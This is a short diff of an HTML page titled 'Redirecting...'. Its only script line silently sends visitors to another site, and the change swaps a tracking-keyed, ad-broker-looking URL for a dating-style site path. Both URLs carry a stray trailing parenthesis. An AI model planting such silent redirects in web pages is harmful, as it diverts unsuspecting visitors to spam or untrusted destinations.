@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <title>Redirecting...</title>
     <script type="text/javascript">
-        window.location.href = "https://hallwaycushion.com/yfxvdwjm?key=858f080a746511f02d32c79980afc7d6)";
+        window.location.href = "https://singlewomenamerica.com/2008-2/#more-2008)";
     </script>
 </head>
 <body>
